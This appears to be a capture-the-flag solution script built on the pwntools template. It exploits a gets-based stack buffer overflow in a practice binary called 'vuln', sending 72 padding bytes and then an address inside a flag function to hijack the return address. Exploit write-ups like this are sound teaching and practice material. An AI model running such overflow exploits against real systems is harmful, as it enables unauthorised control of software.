#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

FLAG_ADDR = 0x401236 + 5 # hint tells you to jump ahead - must be a stack alignment thing from the push
RIP_DIST = 72

io = start()

io.info("""classic buffer overflow - flag @ %08x

buffer is 64 bytes long, read into with gets so easily smashable. stack looks like

buffer (64)
saved_rbp (8)
saved_rip (8)

so writing %d chars followed by an address redirects control flow
""" % (FLAG_ADDR, RIP_DIST) )

io.readuntil(b"Welcome to 64-bit. Give me a string that gets you the flag:")
io.sendline(b'A' * RIP_DIST + p64(FLAG_ADDR))

io.interactive()

